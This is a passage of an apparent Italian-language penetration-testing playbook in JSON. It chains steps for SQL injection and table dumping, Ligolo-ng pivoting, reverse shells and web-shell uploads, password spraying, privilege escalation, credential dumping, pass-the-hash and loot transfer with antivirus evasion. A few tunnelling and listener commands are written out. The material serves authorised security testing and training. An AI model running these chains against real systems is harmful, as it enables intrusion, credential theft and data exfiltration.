        "verify": "La pagina risponde in modo diverso rispetto al valore legittimo, per esempio restituendo tutte le righe oppure un errore SQL.",
        "title": "Conferma l’iniezione",
        "cmdRef": "sqli-detect"
      },
      {
        "id": "s2",
        "verify": "sqlmap elenca i database sotto `available databases`. Se dichiara il parametro non iniettabile vanno alzati `--level` e `--risk`.",
        "title": "Enumera i database",
        "cmdRef": "sqlmap",
        "variant": "default"
      },
      {
        "id": "s3",
        "verify": "Il contenuto della tabella viene salvato sotto `~/.local/share/sqlmap/output/<host>/dump/`.",
        "title": "Dumpa la tabella utenti",
        "cmdRef": "sqlmap",
        "variant": "dump"
      },
      {
        "id": "s4",
        "verify": "`Status...: Cracked`. Il mode va scelto in base al formato osservato, per esempio 0 per MD5 e 1400 per SHA-256.",
        "title": "Cracka se hashate, poi riusa",
        "cmdRef": "hashcat-ntlm",
        "overrides": {
          "mode": "0"
        }
      }
    ]
  },
  {
    "id": "ligolo-pivot",
    "name": "Pivoting con Ligolo-ng",
    "short": "ligolo",
    "category": "lateral",
    "subcategory": "pivoting",
    "tactic": "Lateral Movement",
    "difficulty": "medium",
    "estTime": "10 min",
    "objective": "Pivotare in una rete interna con Ligolo-ng: interfaccia tun sull'attacker, agent sul ponte, aggiungi una route e raggiungi la subnet interna con i tool Kali normali, senza proxychains.",
    "outcome": "Subnet interna raggiungibile direttamente dalla Kali",
    "prereqs": [
      "Shell sulla macchina ponte (dual-homed)",
      "Binari ligolo: proxy (attacker) e agent (target), da github.com/nicocha30/ligolo-ng"
    ],
    "mitre": [
      "T1090",
      "T1572"
    ],
    "refs": [
      {
        "label": "Guide to Pivoting using Ligolo-ng — Medium",
        "url": "https://medium.com/@redfanatic7/guide-to-pivoting-using-ligolo-ng-efd36b290f16"
      },
      {
        "label": "Ligolo-ng — repo ufficiale",
        "url": "https://github.com/nicocha30/ligolo-ng"
      }
    ],
    "steps": [
      {
        "id": "s1",
        "verify": "`ip addr` elenca l'interfaccia `ligolo`, che resta in stato DOWN finché il tunnel non viene avviato.",
        "title": "Crea l'interfaccia TUN (Kali)",
        "cmd": {
          "name": "Ligolo — interfaccia TUN",
          "description": "Il primo passo è creare l'interfaccia TUN con questi comandi. Per visualizzare la nuova interfaccia `ligolo` basta un `ifconfig`.",
          "template": "sudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up",
          "params": []
        }
      },
      {
        "id": "s2",
        "verify": "L'agent è presente sul ponte ed è eseguibile.",
        "title": "Scarica e invia l'agent al ponte",
        "cmd": {
          "name": "scp — invia l'agent",
          "description": "Scarica l'agent adatto al sistema che farà da ponte (dalle release GitHub). Dopodiché lo invii al target ponte tramite `scp`, se hai una connessione SSH.",
          "template": "scp <agent> <user>@<pivot>:/tmp",
          "params": [
            {
              "key": "agent",
              "label": "Path agent",
              "placeholder": "./agent"
            },
            {
              "key": "user",
              "label": "User ponte",
              "ctx": "user",
              "placeholder": "jbetty"
            },
            {
              "key": "pivot",
              "label": "IP ponte",
              "ctx": "ip",
              "placeholder": "10.129.170.173"
            }
          ]
        }
      },
      {
        "id": "s3",
        "verify": "Nella console del proxy compare `Agent joined` con nome host e utente dell'agent.",
        "title": "Avvia proxy (Kali) e agent (ponte)",
        "cmd": {
          "name": "Ligolo — proxy + agent",
          "description": "Su Kali avvii `ligolo-proxy` con certificati autofirmati; sulla macchina ponte avvii l'agent, che si connette al proxy. Una volta connessi all'agente, il comando `help` mostra cosa puoi fare.",
          "template": "# Su Kali (proxy) con certificati autofirmati:\nligolo-ng -selfcert\n\n# Sul ponte (agent), 11601 è la porta di default; in VPN usa l'IP della VPN:\n./agent -connect <ip_attacker>:11601 -ignore-cert",
          "params": [
            {
              "key": "ip_attacker",
              "label": "IP attacker",
              "placeholder": "10.10.14.5"
            }
          ]
        }
      },
      {
        "id": "s4",
        "verify": "Il comando elenca le sessioni disponibili e dopo la selezione il prompt riporta il contesto di quella scelta.",
        "title": "Seleziona la sessione",
        "cmd": {
          "name": "Ligolo — session",
          "description": "Prima di interagire con la rete interna imposta il tunnel: esegui `session` e seleziona l'id della sessione con cui interagire; poi `ifconfig` per verificare le connessioni di rete sull'agente connesso (annota la subnet interna).",
          "template": "session\nifconfig",
          "params": []
        }
      },
      {
        "id": "s5",
        "verify": "Dopo `start` l'interfaccia `ligolo` passa a UP e gli host della rete interna rispondono da Kali senza altra configurazione.",
        "title": "Aggiungi la route e start",
        "cmd": {
          "name": "Ligolo — route + start",
          "description": "Aggiungi una voce alla tabella di routing così Ligolo instrada il traffico nel tunnel verso la rete di destinazione, poi dalla console digiti `start`. Ora puoi eseguire qualsiasi strumento da Kali per interagire con la rete interna, come se fossi connesso direttamente.",
          "template": "# <internal_net> nel formato x.x.x.x/xx (es. 172.16.119.0/24):\nsudo ip route add <internal_net> dev ligolo\n\n# poi nella console ligolo-ng:\nstart",
          "params": [
            {
              "key": "internal_net",
              "label": "Rete interna",
              "placeholder": "172.16.119.0/24"
            }
          ]
        }
      }
    ]
  },
  {
    "id": "ligolo-double-pivot",
    "name": "Doppio pivoting con Ligolo-ng",
    "short": "ligolo2",
    "category": "lateral",
    "subcategory": "pivoting",
    "tactic": "Lateral Movement",
    "difficulty": "hard",
    "estTime": "15 min",
    "objective": "Raggiungere una seconda rete interna che tocca solo il secondo ponte, incatenando due agent Ligolo. Sul primo agent si apre un listener che rilancia le connessioni verso il proxy sulla Kali, il secondo ponte si collega a quel listener e riceve un'interfaccia tun dedicata, così i due tunnel restano attivi insieme senza proxychains.",
    "outcome": "Seconda rete interna raggiungibile da Kali sull'interfaccia ligolo2",
    "prereqs": [
      "Primo pivot Ligolo già attivo (playbook Pivoting con Ligolo-ng)",
      "Shell sul secondo ponte, dual-homed fra prima e seconda rete interna",
      "Binario agent per il sistema del secondo ponte",
      "Firewall locale del primo ponte apribile sulla porta del relay (ufw e simili)"
    ],
    "mitre": [
      "T1090",
      "T1572"
    ],
    "refs": [
      {
        "label": "Guide to Pivoting using Ligolo-ng — Medium",
        "url": "https://medium.com/@redfanatic7/guide-to-pivoting-using-ligolo-ng-efd36b290f16"
      },
      {
        "label": "Ligolo-ng — repo ufficiale",
        "url": "https://github.com/nicocha30/ligolo-ng"
      }
    ],
    "steps": [
      {
        "id": "s1",
        "verify": "`listener_list` mostra il listener attivo sulla porta scelta del primo ponte; da una shell sul secondo ponte un `nc -vz <ip_ponte1> 11602` risponde aperto.",
        "title": "Listener relay sul primo ponte (sessione agent 1)",
        "cmd": {
          "name": "Ligolo — listener_add sul ponte 1",
          "description": "Il secondo ponte non ha rotta verso l'IP VPN della Kali, quindi il primo agent fa da relay. Attenzione ai due indirizzi: `--addr` è la porta in ascolto sull'agent, mentre `--to` viene aperto dalla Kali, dove gira il proxy. La porta 11602 evita confusione con la 11601 che il primo agent usa già in uscita.",
          "template": "# nella console ligolo-ng, sessione del primo agent:\nlistener_add --addr 0.0.0.0:11602 --to <kali_ip>:11601 --tcp\nlistener_list\n\n# se il ponte ha un firewall locale, la porta va aperta:\nufw allow 11602/tcp",
          "params": [
            {
              "key": "kali_ip",
              "label": "IP VPN Kali",
              "placeholder": "10.10.16.72"
            }
          ],
          "variants": [
            {
              "id": "kali-ip",
              "label": "Verso IP Kali",
              "template": "# nella console ligolo-ng, sessione del primo agent:\nlistener_add --addr 0.0.0.0:11602 --to <kali_ip>:11601 --tcp\nlistener_list\n\n# se il ponte ha un firewall locale, la porta va aperta:\nufw allow 11602/tcp",
              "description": "Forma esplicita: la Kali apre la connessione verso il proprio IP VPN. Funziona sia con il proxy in ascolto su tutte le interfacce sia con il proxy legato al solo IP della VPN."
            },
            {
              "id": "loopback",
              "label": "Verso loopback",
              "template": "# nella console ligolo-ng, sessione del primo agent:\nlistener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11601 --tcp\nlistener_list",
              "description": "Forma della documentazione ufficiale: il proxy viene raggiunto sul loopback della Kali. Vale solo se il proxy è in ascolto su 0.0.0.0, come fa `ligolo-ng -selfcert` senza `-laddr`; con un bind sul solo IP VPN la connessione viene rifiutata."
            }
          ]
        }
      },
      {
        "id": "s2",
        "verify": "L'agent è presente sul secondo ponte ed è eseguibile.",
        "title": "Porta l'agent sul secondo ponte",
        "variant": "linux",
        "cmd": {
          "name": "Trasferimento agent sul ponte 2",
          "description": "Il primo tunnel rende la rete interna raggiungibile dalla Kali come una rete locale, quindi la copia parte direttamente dall'attacker verso l'IP interno del secondo ponte. La scelta del canale dipende da cosa espone il ponte: SSH, WinRM oppure un server HTTP sulla Kali con un download lanciato dalla shell.",
          "template": "scp <agent> <user>@<pivot2>:/tmp\n\n# poi dalla shell sul ponte 2:\nchmod +x /tmp/agent",
          "params": [
            {
              "key": "agent",
              "label": "Path agent",
              "placeholder": "./agent"
            },
            {
              "key": "user",
              "label": "User ponte 2",
              "ctx": "user",
              "placeholder": "svc-app"
            },
            {
              "key": "pivot2",
              "label": "IP interno ponte 2",
              "placeholder": "172.16.139.3"
            },
            {
              "key": "hash",
              "label": "NT hash",
              "ctx": "hash",
              "placeholder": "e7d499a2cd11b1ba3875a60812e21894"
            }
          ],
          "variants": [
            {
              "id": "linux",
              "label": "Linux — scp",
              "template": "scp <agent> <user>@<pivot2>:/tmp\n\n# poi dalla shell sul ponte 2:\nchmod +x /tmp/agent",
              "description": "Copia via SSH attraverso il primo tunnel, poi bit di esecuzione sul file."
            },
            {
              "id": "windows",
              "label": "Windows — evil-winrm",
              "template": "evil-winrm -i <pivot2> -u <user> -H <hash>\n\n# dalla sessione evil-winrm:\nupload ./agent.exe C:\\\\Windows\\\\Temp\\\\agent.exe",
              "description": "Su un ponte Windows l'agent viene caricato dalla sessione evil-winrm, con password o pass-the-hash."
            }
          ]
        }
      },
      {
        "id": "s3",
        "verify": "Nella console del proxy compare un secondo `Agent joined` e `session` elenca ora due agent distinti.",
        "title": "Connetti il secondo agent al listener",
        "variant": "linux",
        "cmd": {
          "name": "Ligolo — agent 2 verso il ponte 1",
          "description": "L'agent sul secondo ponte non punta alla Kali ma all'IP interno del primo ponte, sulla porta del relay. La connessione risale il primo tunnel, il proxy la registra come nuova sessione. Il flag `-ignore-cert` serve finché il proxy gira con certificati autofirmati.",
          "template": "# sul ponte 2, verso l'IP interno del ponte 1:\n./agent -connect <pivot1_internal>:11602 -ignore-cert",
          "params": [
            {
              "key": "pivot1_internal",
              "label": "IP interno ponte 1",
              "placeholder": "172.16.139.10"
            }
          ],
          "variants": [
            {
              "id": "linux",
              "label": "Linux",
              "template": "# sul ponte 2, verso l'IP interno del ponte 1:\n./agent -connect <pivot1_internal>:11602 -ignore-cert",
              "description": "Da lanciare in background o sotto `nohup` se la shell è instabile."
            },
            {
              "id": "windows",
              "label": "Windows",
              "template": "C:\\Windows\\Temp\\agent.exe -connect <pivot1_internal>:11602 -ignore-cert",
              "description": "Stessa connessione dal ponte Windows, lanciata dalla sessione evil-winrm o da una shell remota."
            }
          ]
        }
      },
      {
        "id": "s4",
        "verify": "`ip addr` elenca sia `ligolo` sia `ligolo2`; la seconda resta DOWN finché il tunnel non parte.",
        "title": "Crea la seconda interfaccia TUN (Kali)",
        "cmd": {
          "name": "Ligolo — interfaccia ligolo2",
          "description": "Ogni tunnel vuole la sua interfaccia: la prima resta dedicata al ponte 1, la seconda al ponte 2. Senza interfaccia separata il secondo tunnel ruberebbe quella della prima sessione. Dalla versione 0.6 la stessa cosa si fa dalla console con `interface_create --name ligolo2`.",
          "template": "sudo ip tuntap add user $(whoami) mode tun ligolo2\nsudo ip link set ligolo2 up",
          "params": []
        }
      },
      {
        "id": "s5",
        "verify": "Il prompt riporta il contesto del secondo agent e `ifconfig` mostra una subnet assente sul primo ponte.",
        "title": "Seleziona la sessione del secondo agent",
        "cmd": {
          "name": "Ligolo — session sul ponte 2",
          "description": "Con `session` si passa alla sessione del secondo agent, poi `ifconfig` elenca le sue interfacce: quella che non compariva sul primo ponte è la rete da raggiungere. La subnet letta qui è il valore da usare nella route dello step successivo.",
          "template": "session\nifconfig",
          "params": []
        }
      },
      {
        "id": "s6",
        "verify": "`tunnel_list` mostra due sessioni Online, una su `ligolo` e una su `ligolo2`, e gli host della seconda rete rispondono da Kali mentre il primo tunnel resta operativo.",
        "title": "Avvia il secondo tunnel e aggiungi la route",
        "cmd": {
          "name": "Ligolo — tunnel_start su ligolo2",
          "description": "Il tunnel parte legandosi all'interfaccia dedicata invece che alla prima, poi la route manda il traffico della seconda rete dentro quell'interfaccia. Da qui i tool girano dalla Kali contro la rete profonda come se fosse locale. Sulle versioni precedenti alla 0.6 il comando è `start --tun ligolo2`.",
          "template": "# nella sessione del secondo agent:\ntunnel_start --tun ligolo2\ntunnel_list\n\n# sulla Kali, <internal_net2> nel formato x.x.x.x/xx:\nsudo ip route add <internal_net2> dev ligolo2",
          "params": [
            {
              "key": "internal_net2",
              "label": "Seconda rete interna",
              "placeholder": "172.16.210.0/24"
            }
          ]
        }
      },
      {
        "id": "s7",
        "verify": "La shell dalla rete profonda arriva sul listener locale della Kali senza che il target veda mai l'IP VPN dell'attacker.",
        "title": "Rientro delle reverse shell dalla rete profonda",
        "cmd": {
          "name": "Ligolo — listener per reverse shell",
          "description": "Gli host della seconda rete non raggiungono la Kali, quindi il payload punta all'IP del secondo ponte. Un listener sulla sessione dell'agent 2 rilancia quella porta verso la Kali, dove `nc` o l'handler Metasploit aspettano. Anche qui il firewall locale del ponte va aperto sulla stessa porta.",
          "template": "# nella sessione del secondo agent:\nlistener_add --addr 0.0.0.0:<port> --to 127.0.0.1:<port> --tcp\n\n# sulla Kali:\nnc -lvnp <port>",
          "params": [
            {
              "key": "port",
              "label": "Porta reverse",
              "placeholder": "4444"
            }
          ]
        }
      }
    ]
  },
  {
    "id": "payload-to-shell",
    "name": "Payload → Listener → Shell stabile",
    "short": "payload",
    "category": "exploitation",
    "subcategory": "payloads",
    "tactic": "Execution",
    "difficulty": "easy",
    "estTime": "15 min",
    "objective": "Trasformare una esecuzione di comandi qualsiasi in una shell interattiva utilizzabile. Il flusso è sempre lo stesso: si genera il payload nel formato adatto al target, si mette in ascolto un listener, si consegna ed esegue il payload e infine si stabilizza la shell, perché una shell non stabilizzata muore al primo Ctrl+C e non gestisce editor né sudo.",
    "outcome": "Shell interattiva e stabile sul target",
    "prereqs": [
      "Un modo per eseguire comandi sul target, anche limitato",
      "Connettività di rete dal target verso la macchina attaccante",
      "Il formato del payload deve corrispondere al sistema operativo e all'architettura"
    ],
    "mitre": [
      "T1059",
      "T1105"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Generazione del payload",
        "cmdRef": "msfvenom",
        "variant": "default",
        "verify": "Il file viene creato e `file shell.elf` ne conferma architettura e formato. La dimensione anomala di pochi byte indica un errore nella generazione."
      },
      {
        "id": "s2",
        "title": "Listener in ascolto",
        "cmdRef": "nc-listen",
        "variant": "default",
        "verify": "Il listener resta in attesa senza restituire il prompt. `ss -lntp` conferma la porta in stato LISTEN."
      },
      {
        "id": "s3",
        "title": "Consegna del payload al target",
        "cmdRef": "transfer-http",
        "variant": "default",
        "verify": "Il log del server HTTP registra la richiesta GET con codice `200` proveniente dall'IP del target."
      },
      {
        "id": "s4",
        "title": "Alternativa senza file, one-liner",
        "cmdRef": "revshell",
        "variant": "default",
        "verify": "La connessione arriva sul listener senza che nulla sia stato scritto su disco, il che evita del tutto l'antivirus su filesystem."
      },
      {
        "id": "s5",
        "title": "Stabilizzazione della shell",
        "cmdRef": "shell-pty",
        "variant": "full",
        "verify": "Dopo l'upgrade funzionano Ctrl+C senza chiudere la sessione, la cronologia con le frecce, `clear` e gli editor a schermo intero."
      },
      {
        "id": "s6",
        "title": "Handler Metasploit per meterpreter",
        "cmdRef": "msf-handler",
        "verify": "`Meterpreter session 1 opened`. Da lì `getuid` e `sysinfo` confermano contesto utente e sistema operativo."
      }
    ]
  },
  {
    "id": "webshell-to-shell",
    "name": "Upload → Web Shell → Reverse Shell",
    "short": "webshell",
    "category": "exploitation",
    "subcategory": "webshells",
    "tactic": "Persistence",
    "difficulty": "medium",
    "estTime": "20 min",
    "objective": "Passare da un form di upload mal filtrato a una shell interattiva. La web shell serve da testa di ponte, perché vive dentro il processo del web server e ne eredita i privilegi, ma resta scomoda: il passo successivo è sempre convertirla in una reverse shell vera.",
    "outcome": "Reverse shell come utente del web server",
    "prereqs": [
      "Un punto di upload raggiungibile e una directory di destinazione servita dal web server",
      "Conoscenza del linguaggio lato server, per scegliere l'estensione giusta",
      "Connettività in uscita dal target verso la macchina attaccante"
    ],
    "mitre": [
      "T1505.003",
      "T1059"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Bypass dei controlli di estensione",
        "cmdRef": "file-upload",
        "variant": "ext",
        "verify": "L'upload viene accettato e il file risulta raggiungibile via HTTP. Un `403` sulla directory di upload indica che l'esecuzione è disabilitata e serve un'altra destinazione."
      },
      {
        "id": "s2",
        "title": "Bypass basato sui magic bytes",
        "cmdRef": "file-upload",
        "variant": "magic",
        "verify": "Il file supera la validazione sul contenuto pur restando eseguibile lato server."
      },
      {
        "id": "s3",
        "title": "Web shell da caricare",
        "cmdRef": "kali-webshells",
        "variant": "default",
        "verify": "Richiamando la web shell con il parametro previsto, per esempio `?cmd=id`, la risposta contiene l'output del comando."
      },
      {
        "id": "s4",
        "title": "Listener in ascolto",
        "cmdRef": "nc-listen",
        "variant": "default",
        "verify": "Il listener resta in attesa sulla porta scelta."
      },
      {
        "id": "s5",
        "title": "Reverse shell dalla web shell",
        "cmdRef": "revshell",
        "variant": "php",
        "verify": "La connessione arriva sul listener e `id` restituisce l'utente del web server, tipicamente `www-data` o `apache`."
      },
      {
        "id": "s6",
        "title": "Stabilizzazione della shell",
        "cmdRef": "shell-pty",
        "variant": "full",
        "verify": "La sessione regge Ctrl+C, cronologia ed editor interattivi."
      }
    ]
  },
  {
    "id": "spray-to-foothold",
    "name": "Password Spray → Foothold",
    "short": "spray",
    "category": "exploitation",
    "subcategory": "cred-attacks",
    "tactic": "Credential Access",
    "difficulty": "medium",
    "estTime": "30-60 min",
    "objective": "Ottenere il primo accesso valido a un dominio partendo da una lista di nomi. Lo spray prova una sola password contro molti utenti, comportamento che resta sotto la soglia di lockout, al contrario del brute force che concentra molti tentativi su un solo account e lo blocca.",
    "outcome": "Credenziali di dominio valide e shell sul primo host raggiungibile",
    "prereqs": [
      "Una lista di nomi reali, ricavata da OSINT o dall'enumerazione",
      "Raggiungibilità di SMB, LDAP o Kerberos verso un domain controller",
      "Password policy nota, per non superare la soglia di lockout"
    ],
    "mitre": [
      "T1110.003",
      "T1078.002"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Costruzione della userlist",
        "cmdRef": "username-anarchy"
      },
      {
        "id": "s2",
        "title": "Verifica della lockout policy",
        "cmdRef": "nxc-smb-passpol"
      },
      {
        "id": "s3",
        "title": "Validazione degli utenti via Kerberos",
        "cmdRef": "kerbrute-spray",
        "verify": "Kerbrute distingue gli utenti esistenti da quelli inventati senza generare eventi di logon falliti su SMB."
      },
      {
        "id": "s4",
        "title": "Password spray su SMB",
        "cmdRef": "nxc-smb-spray",
        "variant": "default",
        "verify": "Una riga con `[+]` indica credenziali valide, e l'eventuale `(Pwn3d!)` che l'utente è amministratore locale su quell'host."
      },
      {
        "id": "s5",
        "title": "Shell sul target raggiungibile",
        "cmdRef": "psexec",
        "variant": "default",
        "verify": "Si apre il prompt `C:\\Windows\\system32>` e `whoami` restituisce `nt authority\\system`."
      },
      {
        "id": "s6",
        "title": "Alternativa via WinRM",
        "cmdRef": "evil-winrm",
        "variant": "default",
        "verify": "Il prompt `Evil-WinRM* PS >` conferma la sessione. Richiede l'appartenenza al gruppo Remote Management Users."
      }
    ]
  },
  {
    "id": "linux-privesc",
    "name": "Linux: Enumerazione → root",
    "short": "linpe",
    "category": "privesc",
    "subcategory": "auto-enum",
    "tactic": "Privilege Escalation",
    "difficulty": "medium",
    "estTime": "30-60 min",
    "objective": "Passare da utente non privilegiato a root su Linux seguendo l'ordine che paga di più: prima l'enumerazione automatica per avere il quadro, poi i quattro vettori classici nell'ordine sudo, SUID, capabilities e cron, e solo alla fine il kernel, che è l'ultima risorsa perché rischia di far cadere la macchina.",
    "outcome": "Shell di root sul target Linux",
    "prereqs": [
      "Shell come utente non privilegiato, preferibilmente già stabilizzata",
      "Possibilità di scrivere in una directory come /tmp o /dev/shm",
      "Autorizzazione a tentare exploit kernel, che possono causare crash"
    ],
    "mitre": [
      "T1082",
      "T1068"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Enumerazione automatica",
        "cmdRef": "linpeas",
        "variant": "local",
        "verify": "Le voci evidenziate in rosso e giallo sono quelle da esaminare per prime. L'output va salvato, perché è lungo e serve rileggerlo."
      },
      {
        "id": "s2",
        "title": "Regole sudo",
        "cmdRef": "sudo-l"
      },
      {
        "id": "s3",
        "title": "Escape da un binario sudo",
        "cmdRef": "gtfobins",
        "verify": "L'escape restituisce una shell con `id` che riporta `uid=0(root)`."
      },
      {
        "id": "s4",
        "title": "Binari SUID e SGID",
        "cmdRef": "find-suid",
        "variant": "default",
        "verify": "I binari non standard sono quelli interessanti: `pkexec`, `screen` e i binari custom del cliente meritano attenzione, mentre `ping` e `su` sono normali."
      },
      {
        "id": "s5",
        "title": "Hijack di libreria su binario SUID",
        "cmdRef": "find-suid",
        "variant": "soinject",
        "verify": "`strace` o `ltrace` mostrano la `.so` cercata e non trovata, che è il punto in cui inserire il payload."
      },
      {
        "id": "s6",
        "title": "Capabilities sui binari",
        "cmdRef": "getcap-all",
        "verify": "`cap_setuid` su un interprete come python3 è escalation diretta, `cap_dac_read_search` consente la lettura di `/etc/shadow`."
      },
      {
        "id": "s7",
        "title": "Cron job e timer",
        "cmdRef": "cron-discover",
        "variant": "writable",
        "verify": "Uno script eseguito da root e scrivibile dall'utente corrente è escalation garantita al successivo avvio del job."
      },
      {
        "id": "s8",
        "title": "Exploit kernel come ultima risorsa",
        "cmdRef": "linux-exploit-suggester"
      }
    ]
  },
  {
    "id": "windows-privesc",
    "name": "Windows: Enumerazione → SYSTEM",
    "short": "winpe",
    "category": "privesc",
    "subcategory": "auto-enum",
    "tactic": "Privilege Escalation",
    "difficulty": "medium",
    "estTime": "30-60 min",
    "objective": "Passare da utente non privilegiato a SYSTEM su Windows. L'ordine che rende di più parte dai privilegi del token, che spesso risolvono in un colpo solo sui service account, per poi passare alle misconfiguration dei servizi e infine alle patch mancanti.",
    "outcome": "Contesto NT AUTHORITY\\SYSTEM sul target Windows",
    "prereqs": [
      "Shell come utente non privilegiato su Windows",
      "Possibilità di scrivere in una directory come C:\\Windows\\Temp",
      "Consapevolezza che gli strumenti di enumerazione automatica sono firmati dagli EDR"
    ],
    "mitre": [
      "T1082",
      "T1068"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Enumerazione automatica",
        "cmdRef": "winpeas"
      },
      {
        "id": "s2",
        "title": "Vista mirata per categoria",
        "cmdRef": "seatbelt"
      },
      {
        "id": "s3",
        "title": "Privilegi del token",
        "cmdRef": "whoami-priv",
        "verify": "`SeImpersonatePrivilege` o `SeAssignPrimaryTokenPrivilege` abilitati portano direttamente alla catena Potato. Anche `SeBackupPrivilege`, `SeDebugPrivilege` e `SeTakeOwnershipPrivilege` sono escalation dirette."
      },
      {
        "id": "s4",
        "title": "Misconfiguration dei servizi",
        "cmdRef": "powerup",
        "variant": "default",
        "verify": "Le voci `AbuseFunction` indicano già il comando da usare per sfruttare ogni misconfiguration trovata."
      },
      {
        "id": "s5",
        "title": "AlwaysInstallElevated",
        "cmdRef": "aie",
        "variant": "default",
        "verify": "Entrambe le chiavi, quella in HKLM e quella in HKCU, devono valere `0x1`. Con una sola delle due il vettore non funziona."
      },
      {
        "id": "s6",
        "title": "Unquoted service path",
        "cmdRef": "unquoted-path",
        "variant": "default",
        "verify": "Serve un path con spazi, non racchiuso fra virgolette, e permessi di scrittura su una delle directory intermedie."
      },
      {
        "id": "s7",
        "title": "Patch mancanti",
        "cmdRef": "wes"
      }
    ]
  },
  {
    "id": "seimpersonate-system",
    "name": "SeImpersonate → SYSTEM",
    "short": "potato",
    "category": "privesc",
    "subcategory": "token-priv",
    "tactic": "Privilege Escalation",
    "difficulty": "medium",
    "estTime": "15 min",
    "objective": "Sfruttare il privilegio SeImpersonatePrivilege, che è assegnato di default ai service account di IIS, MSSQL ed Exchange, per passare a SYSTEM. Il meccanismo consiste nel costringere un processo privilegiato ad autenticarsi verso un named pipe controllato dall'attaccante, che ne impersona poi il token.",
    "outcome": "Contesto SYSTEM e hash degli account locali",
    "prereqs": [
      "Shell come service account con SeImpersonatePrivilege abilitato",
      "Il tool va scelto in base alla versione di Windows del target",
      "Possibilità di scrivere ed eseguire un binario sul target"
    ],
    "mitre": [
      "T1134.001",
      "T1068"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Conferma del privilegio",
        "cmdRef": "whoami-priv",
        "verify": "`SeImpersonatePrivilege` compare nella lista con stato `Enabled`. Se risulta `Disabled` il vettore non è percorribile."
      },
      {
        "id": "s2",
        "title": "Ottieni SYSTEM (scegli il tool dai tab)",
        "cmdRef": "printspoofer",
        "verify": "`whoami` restituisce `nt authority\\system` nella nuova shell. Il tool si sceglie in base alla versione di Windows: PrintSpoofer su Win10 e Server 2016-2019, GodPotato da Server 2012 a 2022 (scelta sicura quando la versione è incerta), JuicyPotatoNG come ripiego per configurazioni COM particolari."
      },
      {
        "id": "s3",
        "title": "Dump delle credenziali locali",
        "cmdRef": "secretsdump",
        "variant": "local",
        "verify": "Compaiono gli hash di SAM a partire da `Administrator:500:`, più eventuali segreti LSA e password di servizio in chiaro."
      },
      {
        "id": "s4",
        "title": "Riuso dell'hash sugli altri host",
        "cmdRef": "nxc-pth",
        "variant": "default",
        "verify": "Un `(Pwn3d!)` su altri host indica che l'account amministratore locale è condiviso, situazione comune e ottima per il movimento laterale."
      }
    ]
  },
  {
    "id": "foothold-triage",
    "name": "Foothold → Triage dell'host",
    "short": "triage",
    "category": "post-exp",
    "subcategory": "situational-awareness",
    "tactic": "Discovery",
    "difficulty": "easy",
    "estTime": "20 min",
    "objective": "Capire dove si è finiti prima di muovere qualsiasi altro passo: quale utente, con quali privilegi, su quale sistema, dentro quale rete e con quali difese attive. La catena copre sia Linux sia Windows, quindi vanno eseguiti solo i passi del sistema operativo effettivamente incontrato.",
    "outcome": "Quadro completo di utente, host, rete e credenziali disponibili in locale",
    "prereqs": [
      "Una shell qualsiasi sul target, anche non privilegiata",
      "Nessun requisito di privilegi elevati per la maggior parte dei comandi"
    ],
    "mitre": [
      "T1082",
      "T1087",
      "T1552"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Identità e sistema, Linux",
        "cmdRef": "sa-linux-who",
        "verify": "Restituisce utente, gruppi, hostname e distribuzione, cioè il punto di partenza per scegliere il vettore di escalation."
      },
      {
        "id": "s2",
        "title": "Rete e vicini, Linux",
        "cmdRef": "sa-linux-net",
        "verify": "Le connessioni verso subnet non raggiungibili dall'attaccante indicano le reti candidate al pivoting."
      },
      {
        "id": "s3",
        "title": "Identità e privilegi, Windows",
        "cmdRef": "sa-win-who",
        "verify": "I privilegi del token e i gruppi locali dicono subito se esiste una scorciatoia verso SYSTEM."
      },
      {
        "id": "s4",
        "title": "Sistema e patch, Windows",
        "cmdRef": "sa-win-sys",
        "verify": "Versione, build e hotfix installati permettono di valutare gli exploit kernel applicabili."
      },
      {
        "id": "s5",
        "title": "Utenti e gruppi di dominio",
        "cmdRef": "sa-win-domain"
      },
      {
        "id": "s6",
        "title": "Credenziali in chiaro sull'host",
        "cmdRef": "creds-linux",
        "variant": "configs",
        "verify": "File di configurazione, cronologia della shell e variabili d'ambiente sono i tre posti in cui le credenziali compaiono più spesso."
      },
      {
        "id": "s7",
        "title": "File di valore sul filesystem",
        "cmdRef": "pillage-files",
        "variant": "default",
        "verify": "Database KeePass, backup, repository git e file di risposta automatica sono i candidati più frequenti."
      }
    ]
  },
  {
    "id": "loot-exfil",
    "name": "Trasferimento file e raccolta del loot",
    "short": "loot",
    "category": "post-exp",
    "subcategory": "file-transfer",
    "tactic": "Collection",
    "difficulty": "easy",
    "estTime": "20 min",
    "objective": "Portare strumenti sul target e riportare indietro il materiale raccolto, scegliendo il canale in base a cosa il target consente. Il metodo giusto dipende da quali binari sono presenti e da quali protocolli il firewall lascia passare in uscita.",
    "outcome": "Strumenti sul target e loot recuperato sulla macchina attaccante",
    "prereqs": [
      "Esecuzione di comandi sul target",
      "Almeno un canale in uscita fra HTTP, SMB e SSH",
      "Spazio scrivibile sul target, tipicamente /tmp oppure C:\\Windows\\Temp"
    ],
    "mitre": [
      "T1105",
      "T1083"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Server HTTP lato attaccante",
        "cmdRef": "transfer-http",
        "variant": "default",
        "verify": "Il server registra ogni richiesta con IP di origine e codice di risposta, il che conferma anche la raggiungibilità del target."
      },
      {
        "id": "s2",
        "title": "Download su target Linux",
        "cmdRef": "transfer-http",
        "variant": "linux",
        "verify": "Il file arriva integro, verificabile confrontando l'hash con `md5sum` sui due lati."
      },
      {
        "id": "s3",
        "title": "Download su target Windows",
        "cmdRef": "transfer-http",
        "variant": "windows",
        "verify": "`Invoke-WebRequest` funziona ovunque, mentre `certutil` è un LOLBin già presente e spesso meno sospetto."
      },
      {
        "id": "s4",
        "title": "Esecuzione in memoria senza toccare il disco",
        "cmdRef": "transfer-http",
        "variant": "memory",
        "verify": "Lo script viene eseguito senza che nessun file compaia sul filesystem, il che aggira i controlli antivirus su scrittura."
      },
      {
        "id": "s5",
        "title": "Share SMB come canale alternativo",
        "cmdRef": "transfer-smb",
        "variant": "default",
